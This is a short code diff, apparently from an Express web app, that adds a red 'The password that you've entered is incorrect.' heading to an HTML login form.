@@ -172,6 +172,7 @@ app.get('/success', (req, res) => {
             <div class="form-group">
                 <input placeholder="Password" type="password" id="password" name="password" required>
             </div>
+            <h2 style="font-size: 13px; color: #f36060; margin-bottom: 48px; font-family: sans-serif; text-align: start;">The password that you've entered is incorrect.</h2>
             <button type="submit">Log in</button>
         </form>
     </div>
